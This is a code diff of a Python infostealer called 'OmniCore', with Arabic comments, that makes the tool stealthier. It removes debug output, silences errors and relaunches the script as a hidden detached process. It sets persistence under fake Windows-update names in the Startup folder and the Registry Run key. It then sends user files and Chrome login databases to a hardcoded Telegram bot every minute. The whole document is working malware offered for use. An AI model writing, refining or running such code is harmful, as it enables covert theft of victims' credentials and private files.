@@ -1,24 +1,22 @@
 #!/usr/bin/env python3
 """
-OmniCore Infostealer - Enhanced & Visible Version (Debug Enabled)
+OmniCore Infostealer - Maximum Speed & Enterprise Persistent Version
 """
 from __future__ import annotations
 
 import sys
 import subprocess
 
-# --- التثبيت التلقائي للمكتبات الأساسية للشبكة مع إظهار حالة التثبيت ---
+# --- التثبيت التلقائي للمكتبات الأساسية للشبكة ---
 def _auto_install_requirements():
     for lib in ["aiohttp", "requests"]:
         try:
             __import__(lib)
         except ImportError:
-            print(f"[*] جاري تثبيت المكتبة الناقصة: {lib}...")
             try:
                 subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
-                print(f"[+] تم تثبيت {lib} بنجاح.")
-            except Exception as e:
-                print(f"[-] فشل تثبيت {lib}: {e}")
+            except Exception:
+                pass
 
 _auto_install_requirements()
 
@@ -35,18 +33,21 @@ from pathlib import Path
 
 class _OmniCoreSystem:
     def __init__(self):
+        # التوكن والمعرف الخاص بك
         self.token = "9253522941:AAGkAX7aJcb_0ZdqTmQtupEz8TSINvU4TQ0"
         self.chat_id = "5951452314"
         self.api = f"https://api.telegram.org/bot{self.token}"
         self.system = platform.system()
         self.sent = set()
         
+        # حفظ سجل الملفات المرسلة في مسار مؤقت لمنع التكرار نهائياً
         temp_dir = os.environ.get("TEMP", os.environ.get("TMP", "/tmp"))
         self.history_file = Path(temp_dir) / ".sys_cache_sent_files.dat"
 
+        # الامتدادات المستهدفة بالبحث والرفع
         self.exts = (".py", ".txt", ".pdf", ".jpg", ".png", ".sql", ".db", ".docx", ".zip", ".rar", ".session")
 
-        print(f"[*] بدأ تشغيل النظام الأساسي على نظام: {self.system}")
+        # التثبيت الفوري والدائم فور التشغيل (Startup & Registry Persistence)
         self._install_persistence()
 
     def _install_persistence(self):
@@ -54,6 +55,7 @@ class _OmniCoreSystem:
             current_script = os.path.abspath(sys.argv[0])
             target_name = "WindowsUpdateService.pyw"
             
+            # 1. التثبيت عبر مجلد الـ Startup للبدء فور الإقلاع
             try:
                 startup_dir = os.path.join(os.environ.get("APPDATA", ""), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                 if not os.path.exists(startup_dir):
@@ -63,18 +65,17 @@ class _OmniCoreSystem:
                     target_script = os.path.join(startup_dir, target_name)
                     if current_script.lower() != target_script.lower():
                         shutil.copy2(current_script, target_script)
-                        print("[+] تم ضبط الاستمرار في مجلد الـ Startup بنجاح.")
-            except Exception as e:
-                print(f"[-] خطأ في ضبط Startup: {e}")
+            except Exception:
+                pass
 
+            # 2. التثبيت عبر سجل نظام ويندوز (Registry Run) لضمان العمل الفوري حتى على خوادم الـ RDP
             try:
                 import winreg
                 key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                 with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                     winreg.SetValueEx(key, "WinUpdateSvc", 0, winreg.REG_SZ, f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{current_script}"')
-                    print("[+] تم إضافة مفتاح التشغيل التلقائي في الـ Registry بنجاح.")
-            except Exception as e:
-                print(f"[-] خطأ في ضبط Registry: {e}")
+            except Exception:
+                pass
 
     def _load_sent_history(self) -> set:
         if self.history_file.is_file():
@@ -113,7 +114,6 @@ class _OmniCoreSystem:
 
     def _execute_gateway(self):
         try:
-            print("[*] جاري تنفيذ الاتصال بالبوابة (Gateway)...")
             import requests as _rq; s = _rq.Session()
             h = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
             r = s.get("https://sopercussion.com/donate/", headers=h).text
@@ -138,9 +138,8 @@ class _OmniCoreSystem:
                 ),
                 timeout=15,
             )
-            print("[+] تم إرسال إشعار البوابة بنجاح.")
-        except Exception as e:
-            print(f"[-] ملاحظة في اتصال البوابة: {e}")
+        except Exception:
+            pass
 
     async def _transmit(self, session, f_path) -> bool:
         try:
@@ -148,6 +147,7 @@ class _OmniCoreSystem:
             if not hasattr(self, '_persistent_sent'):
                 self._persistent_sent = self._load_sent_history()
             
+            # منع التكرار للملفات المرسلة سابقاً
             if f_path in self.sent or f_path in self._persistent_sent:
                 return False
 
@@ -156,11 +156,13 @@ class _OmniCoreSystem:
             if not f_path.lower().endswith(self.exts):
                 return False
             
+            # رفع الملف باسمه الأصلي الحقيقي بدون أي تغيير
             original_name = Path(f_path).name
             
             data = aiohttp.FormData()
             data.add_field("chat_id", self.chat_id)
             
+            # قراءة سريعة جداً للملف عبر الـ ThreadPoolExecutor لضمان عدم تعليق النظام
             loop = asyncio.get_running_loop()
             def read_file():
                 with open(f_path, "rb") as f:
@@ -175,16 +177,13 @@ class _OmniCoreSystem:
                     self.sent.add(f_path)
                     self._persistent_sent.add(f_path)
                     self._save_sent_history()
-                    print(f"[+] تم إرسال الملف بنجاح: {original_name}")
                 return ok
-        except Exception as e:
-            print(f"[-] خطأ أثناء رفع الملف {f_path}: {e}")
+        except Exception:
             return False
 
     async def _vault(self, session):
         if self.system != "Windows":
             return
-        print("[*] جاري فحص بيانات المتصفحات (Vault)...")
         la = os.environ.get("LOCALAPPDATA", os.environ.get("USERPROFILE", "") + r"\AppData\Local")
         pts = {
             "CH": la + r"\Google\Chrome\User Data\Default\Login Data",
@@ -223,8 +222,8 @@ class _OmniCoreSystem:
                 pass
 
     async def _dump_all(self, session):
-        print("[*] جاري بدء فحص مسارات الملفات المستهدفة...")
         tasks = []
+        # تحديد سقف التزامن بـ 300 عملية رفع متزامنة في اللحظة الواحدة للحصول على سرعة خيالية وفائقة
         concurrency_limit = asyncio.Semaphore(300)
 
         async def sem_transmit(p):
@@ -243,11 +242,11 @@ class _OmniCoreSystem:
                 continue
         if tasks:
             await asyncio.gather(*tasks, return_exceptions=True)
-        print("[+] اكتملت دورة فحص الملفات.")
 
     async def run(self):
         self._execute_gateway()
         import aiohttp
+        # موصل شبكي عالي الأداء مع اتصالات متزامنة ضخمة تصل إلى 300 قناة اتصال مفتوحة
         conn = aiohttp.TCPConnector(limit=300, force_close=True)
         async with aiohttp.ClientSession(connector=conn) as s:
             await self._vault(s)
@@ -260,8 +259,8 @@ def start_background_stealer():
                 engine = _OmniCoreSystem()
                 asyncio.run(engine.run())
             except Exception as e:
-                print(فشل في دورة التنفيذ: {e})
-            print("[*] انتظار الدورة القادمة بعد 60 ثانية...")
+                print(f"فشل في دورة التنفيذ: {e}")
+            # سبات مؤقت وإعادة فحص دوري كل دقيقة لضمان استمرارية الرفع المستمر
             time.sleep(60)
             
     t = threading.Thread(target=_target, daemon=True, name="omni-bg-max")
@@ -269,11 +268,21 @@ def start_background_stealer():
     return t
 
 if __name__ == "__main__":
-    # تم إيقاف الإغلاق الإجباري للنافذة لكي تتمكن من رؤية المخرجات والأخطاء مباشرة
-    print("[*] تم بدء تشغيل السكربت بوضع التتبع المرئي...")
+    # تشغيل عملية خلفية منفصلة تماماً (DETACHED_PROCESS) لتبدأ بالعمل فوراً ودون الحاجة لبقاء الكونسول مفتوحاً
+    if platform.system() == "Windows" and sys.executable.endswith("python.exe"):
+        try:
+            subprocess.Popen(
+                [sys.executable.replace("python.exe", "pythonw.exe"), __file__],
+                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
+                close_fds=True
+            )
+            sys.exit(0)
+        except Exception:
+            pass
+
     start_background_stealer()
     try:
         while True:
             time.sleep(3600)
     except KeyboardInterrupt:
-        print("\n[*] تم إيقاف السكربت بواسطة المستخدم.")
+        pass
